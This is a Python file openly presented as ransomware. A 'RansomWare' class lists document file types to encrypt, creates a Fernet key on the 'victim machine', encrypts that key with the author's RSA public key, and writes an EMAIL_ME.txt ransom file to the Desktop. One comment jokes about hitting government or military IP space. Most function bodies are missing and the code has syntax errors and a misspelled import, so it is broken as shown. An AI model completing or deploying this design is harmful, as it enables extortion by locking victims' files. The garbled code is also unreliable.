# Import the necessary libraries
from cryptoraphy.fernet import Fernet
import os



class RansomWare:

    
    # File exstensions to seek out and Encrypt
    file_exts = [
        '.txt', '.log', '.csv', '.doc', '.docx' '.xls', '.pdf', '.xlsx', '.ppt'
        

    ]


    def __init__(self):
        # Key that will be used for Fernet object and encrypt/decrypt method
       
             
        # Encrypt/Decrypter
        
        # RSA public key used for encrypting/decrypting fernet object eg, Symmetric key
        

        ''' Root directorys to start Encryption/Decryption from
            CAUTION: Do NOT use self.sysRoot on your own PC as you could end up messing up your system etc...
            CAUTION: Play it safe, create a mini root directory to see how this software works it is no different
            CAUTION: eg, use 'localRoot' and create Some folder directory and files in them folders etc.
        '''
        # Use sysroot to create absolute path for files, etc. And for encrypting whole system
        
        # Use localroot to test encryption softawre and for absolute path for files and encryption of "test system"
         # Debugging/Testing

        # Get public IP of person, for more analysis etc. (Check if you have hit gov, military ip space LOL)
        


    # Generates [SYMMETRIC KEY] on victim machine which is used to encrypt the victims data
    def generate_key(self):
        # Generates a url safe(base64 encoded) key
        
        # Creates a Fernet object with encrypt/decrypt methods
        

    
    # Write the fernet(symmetric key) to text file
    def write_key(self):
        


    # Encrypt [SYMMETRIC KEY] that was created on victim machine to Encrypt/Decrypt files with our PUBLIC ASYMMETRIC-
    # -RSA key that was created on OUR MACHINE. We will later be able to DECRYPT the SYSMETRIC KEY used for-
    # -Encrypt/Decrypt of files on target machine with our PRIVATE KEY, so that they can then Decrypt files etc.
    def encrypt_fernet_key(self):
        with open('fernet_key.txt', 'rb')


        with open('fernet_key.txt', 'wb') as f:
            # Public RSA key
            
            # Public encrypter object
            
            # Encrypted fernet key
            
            # Write encrypted fernet key to file
            
        # Write encrypted fernet key to dekstop as well so they can send this file to be unencrypted and get system/files back
        with open(f'{self.sysRoot}Desktop/EMAIL_ME.txt', 'wb') as fa:
            
        # Assign self.key to encrypted fernet key
        
        # Remove fernet crypter object
        self.crypter = None
